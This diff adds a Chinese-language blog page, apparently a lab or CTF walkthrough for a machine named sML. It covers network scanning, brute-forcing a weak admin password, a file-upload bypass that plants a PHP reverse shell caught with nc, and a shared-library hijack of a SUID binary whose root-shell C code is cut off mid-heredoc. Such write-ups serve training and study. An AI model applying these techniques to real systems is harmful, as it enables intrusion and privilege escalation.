@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)
+
+复盘一下
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l  
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.174
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
+Nmap scan report for 192.168.205.174
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
+                            
+```
+
+看web
+
+![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)
+
+试了一下弱密码，发现可以爆破user
+
+![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)
+
+爆破的同时看了一下源码，发现了他是使用的模板
+
+![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)
+
+下载一份
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
+--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
+正在解析主机 www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
+正在连接 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... 已连接。">
+<meta property="og:title" content="内部_sML">
+<meta property="og:description" content="![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)
+
+复盘一下
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l  
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.174
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
+Nmap scan report for 192.168.205.174
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
+                            
+```
+
+看web
+
+![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)
+
+试了一下弱密码，发现可以爆破user
+
+![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)
+
+爆破的同时看了一下源码，发现了他是使用的模板
+
+![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)
+
+下载一份
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
+--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
+正在解析主机 www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
+正在连接 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... 已连接。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_sML.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_sML</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_sML</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/137" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/81f7b3a564102b39cd787fe795f8c0b7b4fc6e1685cf7f1a96ecfab41cfdbdee/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353535363636352e77656270"><img src="https://camo.githubusercontent.com/81f7b3a564102b39cd787fe795f8c0b7b4fc6e1685cf7f1a96ecfab41cfdbdee/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353535363636352e77656270" alt="image-20250710215549207" data-canonical-src="https://7r1umphk.github.io/image/20250710215556665.webp" style="max-width: 100%;"></a></p>
+<p>复盘一下</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sudo arp-scan -l  
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p- 192.168.205.174
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
+Nmap scan report for 192.168.205.174
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
+                            
+</code></pre>
+<p>看web</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fd95549e4519ff69e0458a386aea41a0160b924a719ae1e8fdb655ca5ece0dff/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353732373938342e77656270"><img src="https://camo.githubusercontent.com/fd95549e4519ff69e0458a386aea41a0160b924a719ae1e8fdb655ca5ece0dff/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353732373938342e77656270" alt="image-20250710215727831" data-canonical-src="https://7r1umphk.github.io/image/20250710215727984.webp" style="max-width: 100%;"></a></p>
+<p>试了一下弱密码，发现可以爆破user</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e93daf264455cd2be28010eee88edd9aadfe9db6cb94fa12462404e28de69ee1/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353831383537352e77656270"><img src="https://camo.githubusercontent.com/e93daf264455cd2be28010eee88edd9aadfe9db6cb94fa12462404e28de69ee1/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353831383537352e77656270" alt="image-20250710215818476" data-canonical-src="https://7r1umphk.github.io/image/20250710215818575.webp" style="max-width: 100%;"></a></p>
+<p>爆破的同时看了一下源码，发现了他是使用的模板</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a147eee72910a95ddc834f474f729f832510d0d08ff5cff8b1b7499ebc2f7b42/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353835303035372e77656270"><img src="https://camo.githubusercontent.com/a147eee72910a95ddc834f474f729f832510d0d08ff5cff8b1b7499ebc2f7b42/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303231353835303035372e77656270" alt="image-20250710215849837" data-canonical-src="https://7r1umphk.github.io/image/20250710215850057.webp" style="max-width: 100%;"></a></p>
+<p>下载一份</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
+--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
+正在解析主机 www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
+正在连接 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... 已连接。
+已发出 HTTP 请求，正在等待回应... 200 OK
+长度：1391869 (1.3M) [application/zip]
+正在保存至: “employee_records_system.zip”
+
+employee_records_system.zip                  100%[============================================================================================&gt;]   1.33M   200KB/s  用时 6.8s    
+
+2025-07-10 09:59:44 (200 KB/s) - 已保存 “employee_records_system.zip” [1391869/1391869])
+
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ unzip employee_records_system.zip
+Archive:  employee_records_system.zip
+   creating: employee_records_system/css/
+  inflating: employee_records_system/css/font-awesome.css  
+  inflating: employee_records_system/css/font-awesome.min.css  
+   creating: employee_records_system/css/images/
+  inflating: employee_records_system/css/images/ui-icons_444444_256x240.png  
+  inflating: employee_records_system/css/images/ui-icons_555555_256x240.png  
+  inflating: employee_records_system/css/images/ui-icons_777620_256x240.png  
+  inflating: employee_records_system/css/images/ui-icons_777777_256x240.png  
+  inflating: employee_records_system/css/images/ui-icons_cc0000_256x240.png  
+  inflating: employee_records_system/css/images/ui-icons_ffffff_256x240.png  
+  inflating: employee_records_system/css/jquery-ui.css  
+  inflating: employee_records_system/css/style.css  
+   creating: employee_records_system/dashboard/
+  inflating: employee_records_system/dashboard/add_employee.php  
+  inflating: employee_records_system/dashboard/add_user.php  
+  inflating: employee_records_system/dashboard/addemployee.php  
+  inflating: employee_records_system/dashboard/adduser.php  
+  inflating: employee_records_system/dashboard/current_employees.php  
+  inflating: employee_records_system/dashboard/edit_employee.php  
+  inflating: employee_records_system/dashboard/editemployee.php  
+  inflating: employee_records_system/dashboard/getData.php  
+  inflating: employee_records_system/dashboard/index.php  
+  inflating: employee_records_system/dashboard/logout.php  
+  inflating: employee_records_system/dashboard/past_employees.php  
+  inflating: employee_records_system/dashboard/retrievedata.php  
+  inflating: employee_records_system/dashboard/settings.php  
+  inflating: employee_records_system/dashboard/uploadID.php  
+  inflating: employee_records_system/dashboard/uploadimage.php  
+   creating: employee_records_system/database file/
+  inflating: employee_records_system/database file/sharp_db.sql  
+   creating: employee_records_system/fonts/
+  inflating: employee_records_system/fonts/FontAwesome.otf  
+  inflating: employee_records_system/fonts/fontawesome-webfont.eot  
+  inflating: employee_records_system/fonts/fontawesome-webfont.svg  
+  inflating: employee_records_system/fonts/fontawesome-webfont.ttf  
+  inflating: employee_records_system/fonts/fontawesome-webfont.woff  
+  inflating: employee_records_system/fonts/fontawesome-webfont.woff2  
+   creating: employee_records_system/images/
+  inflating: employee_records_system/images/body_bg.jpg  
+  inflating: employee_records_system/images/logo.png  
+  inflating: employee_records_system/images/print.png  
+  inflating: employee_records_system/images/times.png  
+   creating: employee_records_system/inc/
+  inflating: employee_records_system/inc/db_connect.php  
+  inflating: employee_records_system/inc/header.php  
+  inflating: employee_records_system/index.php  
+   creating: employee_records_system/js/
+  inflating: employee_records_system/js/global.js  
+  inflating: employee_records_system/js/jquery.mask.js  
+  inflating: employee_records_system/js/jquery.min.js  
+  inflating: employee_records_system/js/jquery-ui.min.js  
+   creating: employee_records_system/phpclasses/
+  inflating: employee_records_system/phpclasses/pagination.php  
+  inflating: employee_records_system/READme.md  
+   creating: employee_records_system/uploads/
+   creating: employee_records_system/uploads/employees_ids/
+  inflating: employee_records_system/uploads/employees_ids/76xq1kHzYEaSZum_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg  
+  inflating: employee_records_system/uploads/employees_ids/JeytInUiX9OuLEx_no-image-available.png  
+   creating: employee_records_system/uploads/employees_photos/
+  inflating: employee_records_system/uploads/employees_photos/G2IHhlrobeUFmQB_ava.jpg  
+  inflating: employee_records_system/uploads/employees_photos/i0e2fodkG79IDU8_ava.jpg  
+  inflating: employee_records_system/uploads/employees_photos/ZtYMgxRNGcFn9SQ_avatar.jpg  
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cd employee_records_system 
+                                     
+┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/employee_records_system]
+└─$ ls -al
+总计 25
+drwxr-xr-x 1 kali kali 4096  7月10日 09:59  .
+drwxr-xr-x 1 kali kali 8192  7月10日 09:59  ..
+drwxr-xr-x 1 kali kali    0 2017年 5月21日  css
+drwxr-xr-x 1 kali kali 4096 2017年 5月21日  dashboard
+drwxr-xr-x 1 kali kali    0 2017年 5月21日 'database file'
+drwxr-xr-x 1 kali kali 4096 2017年 5月21日  fonts
+drwxr-xr-x 1 kali kali    0 2017年 5月21日  images
+drwxr-xr-x 1 kali kali    0 2017年 5月21日  inc
+-rwxr-xr-x 1 kali kali 4037 2021年 2月24日  index.php
+drwxr-xr-x 1 kali kali    0 2017年 5月21日  js
+drwxr-xr-x 1 kali kali    0 2017年 5月21日  phpclasses
+-rwxr-xr-x 1 kali kali  598 2017年 5月21日  READme.md
+drwxr-xr-x 1 kali kali    0 2017年 5月21日  uploads
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/employee_records_system]
+└─$ cd 'database file'        
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/…/x/tmp/employee_records_system/database file]
+└─$ ls -al
+总计 7
+drwxr-xr-x 1 kali kali    0 2017年 5月21日 .
+drwxr-xr-x 1 kali kali 4096  7月10日 09:59 ..
+-rwxr-xr-x 1 kali kali 2411 2021年 2月24日 sharp_db.sql
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/…/x/tmp/employee_records_system/database file]
+└─$ cat sharp_db.sql  
+-- phpMyAdmin SQL Dump
+-- version 4.5.2
+-- http://www.phpmyadmin.net
+--
+-- Host: 127.0.0.1
+-- Generation Time: May 20, 2017 at 04:21 PM
+-- Server version: 5.7.9
+-- PHP Version: 5.6.16
+
+SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
+SET time_zone = "+00:00";
+
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8mb4 */;
+
+--
+-- Database: `sharp_db`
+--
+
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `sharp_emp`
+--
+
+DROP TABLE IF EXISTS `sharp_emp`;
+CREATE TABLE IF NOT EXISTS `sharp_emp` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `employee_id` text,
+  `first_name` text NOT NULL,
+  `middle_name` text,
+  `last_name` text NOT NULL,
+  `phone` int(11) NOT NULL,
+  `employee_image` text NOT NULL,
+  `id_type` text NOT NULL,
+  `id_number` text NOT NULL,
+  `id_card_image` text NOT NULL,
+  `residence_address` text NOT NULL,
+  `residence_location` text NOT NULL,
+  `residence_direction` text NOT NULL,
+  `residence_gps` text NOT NULL,
+  `next_of_kin` text NOT NULL,
+  `relationship` text NOT NULL,
+  `phone_of_kin` text NOT NULL,
+  `kin_residence` text NOT NULL,
+  `kin_residence_direction` text NOT NULL,
+  `date_employed` date NOT NULL,
+  `job_type` text NOT NULL,
+  `status` text NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=latin1;
+
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `users`
+--
+
+DROP TABLE IF EXISTS `users`;
+CREATE TABLE IF NOT EXISTS `users` (
+  `user_id` int(11) NOT NULL AUTO_INCREMENT,
+  `firstname` text NOT NULL,
+  `lastname` text NOT NULL,
+  `username` text NOT NULL,
+  `password` text NOT NULL,
+  `accounttype` text NOT NULL,
+  PRIMARY KEY (`user_id`)
+) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
+
+--
+-- Dumping data for table `users`
+--
+
+INSERT INTO `users` (`user_id`, `firstname`, `lastname`, `username`, `password`, `accounttype`) VALUES
+(1, 'Maxwell', 'Morrison', 'xxx2xy', '10a55271c201e41913764ff95b33248b', 'Admin'),
+(3, 'Maxwell', 'Morrison', 'admins', '02adcdf2171dc7e5757cdd7c0b91fa03', 'Admin');
+
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+                                       
+</code></pre>
+<p>发现了两个用户，和密码哈希（这个密码hash直接拿去john爆破不出来，因为它是(MD5(MD5(password)+MD5(username)))这种架构，这里我没有尝试你们可以尝试一下，还要群里的佬说有一个poc可以利用，我也没有尝试，感兴趣的可以看一下<code class="notranslate">https://www.exploit-db.com/exploits/49596</code>），然后我就直接拿admins用户去burp爆破密码了，因为它是默认密码，而且这个模板好像是8年前的，大概率是弱密码来的</p>
+<p>密码是admin123</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ grep -w -n 'admin123' xato-net-10-million-passwords-100000.txt 
+15582:admin123
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ grep -w -n 'admin123' rockyou.txt                             
+90006:admin123
+10357629:admin123*
+</code></pre>
+<p>挺后的，所以直接打poc是最快的</p>
+<p>如果你跟我一样登录进来的，点add employee然后照片那里先传一个reverse.png(反弹shell php文件)上去，然后抓包改名就好了，它就只做了前端校验</p>
+<p>开抓包<br>
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f941a2be0b21beb93f4f9ba3f69ee21d074bfd6af53ac5459c2de2a940442657/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232313035373833362e77656270"><img src="https://camo.githubusercontent.com/f941a2be0b21beb93f4f9ba3f69ee21d074bfd6af53ac5459c2de2a940442657/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232313035373833362e77656270" alt="image-20250710221057739" data-canonical-src="https://7r1umphk.github.io/image/20250710221057836.webp" style="max-width: 100%;"></a></p>
+<p>改包</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dadf8d42cba161edb6b12deddb6312eac032ca87972fc0c96701606d787634d1/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232313135343733322e77656270"><img src="https://camo.githubusercontent.com/dadf8d42cba161edb6b12deddb6312eac032ca87972fc0c96701606d787634d1/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232313135343733322e77656270" alt="image-20250710221154470" data-canonical-src="https://7r1umphk.github.io/image/20250710221154732.webp" style="max-width: 100%;"></a></p>
+<p>放行</p>
+<p>目录扫描看看上传目录</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ gobuster dir -u http://192.168.205.174 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.174
+[+] Method:                  GET
+[+] Threads:                 64
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html,zip
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.174/images/]
+/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.205.174/uploads/]
+/.php                 (Status: 403) [Size: 280]
+/.html                (Status: 403) [Size: 280]
+/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.174/css/]
+/index.php            (Status: 200) [Size: 1926]
+/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.174/js/]
+/inc                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.174/inc/]
+/fonts                (Status: 301) [Size: 318] [--&gt; http://192.168.205.174/fonts/]
+/dashboard            (Status: 301) [Size: 322] [--&gt; http://192.168.205.174/dashboard/]
+Progress: 34475 / 1102800 (3.13%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 35514 / 1102800 (3.22%)
+===============================================================
+Finished
+===============================================================
+                      
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/22cdf899a24ac6aa6811e0d02dd228b9072e84f65dc70613eda3ca50b662594c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232313330303238352e77656270"><img src="https://camo.githubusercontent.com/22cdf899a24ac6aa6811e0d02dd228b9072e84f65dc70613eda3ca50b662594c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232313330303238352e77656270" alt="image-20250710221300132" data-canonical-src="https://7r1umphk.github.io/image/20250710221300285.webp" style="max-width: 100%;"></a></p>
+<p>kali开监听</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lnvp 8888           
+listening on [any] 8888 ...
+
+</code></pre>
+<p>触发</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lnvp 8888           
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.174] 54352
+Linux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
+ 10:13:26 up 18 min,  0 users,  load average: 0.38, 0.16, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (430): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@sML:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>找提权</p>
+<pre class="notranslate"><code class="notranslate">www-data@sML:/$ cd /h
+cd /home/yulian/
+www-data@sML:/home/yulian$ ls -al
+ls -al
+total 44
+drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
+drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
+lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
+-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
+-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
+-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
+-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
+www-data@sML:/home/yulian$ cat us
+cat user.txt 
+flag{user-fde7951c3a57bc71b03631a9673ab67e}
+www-data@sML:/home/yulian$ strings get_root
+strings get_root
+/lib64/ld-linux-x86-64.so.2
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+hello
+puts
+__cxa_finalize
+__libc_start_main
+libxxoo.so
+libc.so.6
+GLIBC_2.2.5
+/usr/lib/sML
+u/UH
+[]A\A]A^A_
+Starting get_root program...
+;*3$"
+GCC: (Debian 10.2.1-6) 10.2.1 20210110
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+get_root.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@GLIBC_2.2.5
+_edata
+__libc_start_main@GLIBC_2.2.5
+hello
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+</code></pre>
+<p>群主那个xxoo真是太醒目了<br>
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7bb79db4541e7b3a5325d5d73ad0e58f542caf714db57feb3d3b3a4e8a73589e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232323033343636382e77656270"><img src="https://camo.githubusercontent.com/7bb79db4541e7b3a5325d5d73ad0e58f542caf714db57feb3d3b3a4e8a73589e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731303232323033343636382e77656270" alt="image-20250710222034547" data-canonical-src="https://7r1umphk.github.io/image/20250710222034668.webp" style="max-width: 100%;"></a></p>
+<p>那就动态链接库劫持吧</p>
+<pre class="notranslate"><code class="notranslate">www-data@sML:/home/yulian$ ls -al /usr/lib/sML
+ls -al /usr/lib/sML
+total 24
+drwxr-xr-x  2 root root  4096 Jul  7 06:32 .
+drwxr-xr-x 71 root root  4096 Jul  7 06:29 ..
+-rwxrwxrwx  1 root root 15984 Jul  7 06:30 libxxoo.so
+www-data@sML:/home/yulian$ cd /tmp
+cd /tmp
+www-data@sML:/tmp$ cat &lt;&lt; EOF &gt; shell.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void hello() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+}
